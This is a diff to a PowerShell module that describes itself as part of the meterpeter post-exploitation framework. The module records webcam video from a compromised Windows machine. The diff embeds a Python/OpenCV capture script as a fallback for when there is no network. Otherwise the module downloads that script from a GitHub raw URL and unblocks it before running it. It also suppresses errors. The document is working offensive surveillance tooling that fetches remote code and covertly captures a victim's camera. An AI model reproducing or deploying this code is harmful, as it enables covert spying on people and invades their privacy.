@@ -7,7 +7,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: python
    Optional Dependencies: opencv-python
-   PS cmdlet Dev version: v1.0.8
+   PS cmdlet Dev version: v1.1.8
 
 .DESCRIPTION
    Auxiliary Module of meterpeter v2.10.12 that uses opencv-python to record
@@ -81,7 +81,7 @@
 )
 
 
-$cmdletver = "v1.0.8"
+$cmdletver = "v1.1.8"
 $StartPath = (Get-Location).Path
 $ErrorActionPreference = "SilentlyContinue"
 $host.UI.RawUI.WindowTitle = "@Invoke-WebCamAvi $cmdletver"
@@ -156,10 +156,64 @@ If($Force -ieq "false")
 }
 
 
-#Download python script from github
-write-host "  + " -ForegroundColor DarkYellow -NoNewline
-write-host "Downloading python script from github."
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/WebCam.py" -OutFile "$WorkingDir\WebCam.py"|Unblock-File
+## Raw Python Script in the case..
+# we dont have network connection.
+$RawPythonScript = @("import sys
+sys.path.append(`"c:\\users\\pedro\\appdata\\local\\programs\\python\\python39\\lib\\site-packages`")
+import cv2
+import numpy as np
+
+cap = cv2.VideoCapture(0)
+if(cap.isOpened() == False): 
+  print(`"Unable to read camera feed..`")
+
+frame_width = int(cap.get(3))
+frame_height = int(cap.get(4))
+
+out = cv2.VideoWriter('outpy.avi',cv2.VideoWriter_fourcc('M','J','P','G'), 10, (frame_width,frame_height))
+
+while(True):
+  ret, frame = cap.read()
+
+  if ret == True: 
+    
+    out.write(frame)
+
+    #Press Q on keyboard to stop recording
+    if cv2.waitKey(1) & 0xFF == ord('q'):
+      break
+  else:
+    break
+
+cap.release()
+out.release()
+cv2.destroyAllWindows()")
+
+
+#Check for network connection { Only LinkSpeed(s) above: 40 mpbs are accepted }
+$TestConnection = [bool](Get-NetAdapter|Select-Object *|Where-Object { $_.Status -ieq 'Up' -and $_.TransmitLinkSpeed -gt 40000000 })
+If($TestConnection -iNotMatch 'True')
+{
+   #Create WebCam.py insted of downloading it ..
+   write-host "  x " -ForegroundColor Red -NoNewline
+   write-host "Network-Connection: " -ForegroundColor DarkGray -NoNewline
+   write-host "fail to found any UP interface." -ForegroundColor Red
+   Start-Sleep -Seconds 1
+
+   write-host "  * " -ForegroundColor Green -NoNewline
+   write-host "Creating: " -NoNewline
+   write-host "$WorkingDir\WebCam.py" -ForegroundColor Green
+
+   #Create WebCam.py script
+   echo $RawPythonScript|Out-File "$WorkingDir\WebCam.py" -Encoding string -Force
+}
+Else
+{
+   #Download WebCam.py script from github ..
+   write-host "  + " -ForegroundColor DarkYellow -NoNewline
+   write-host "Downloading python script from github."
+   iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/WebCam.py" -OutFile "$WorkingDir\WebCam.py"|Unblock-File
+}
 
 
 #Config WebCam.py python script
@@ -177,7 +231,6 @@ If(-not($RegInstallPath) -or ($RegInstallPath -eq $null))
    write-host "Use-Path: " -ForegroundColor DarkGray -NoNewline
    write-host "$Env:LOCALAPPDATA\Programs\python" -ForegroundColor Green
 }
-
 
 ##Get python 'site-packages' directory { bypass tests invoking -force 'true' }
 $PythonInstallPath = (Get-ChildItem -Path "$RegInstallPath" -Recurse -Force|Where-Object {$_.PSIsContainer -Match "True" -and $_.Name -iMatch 'site-packages'}).FullName
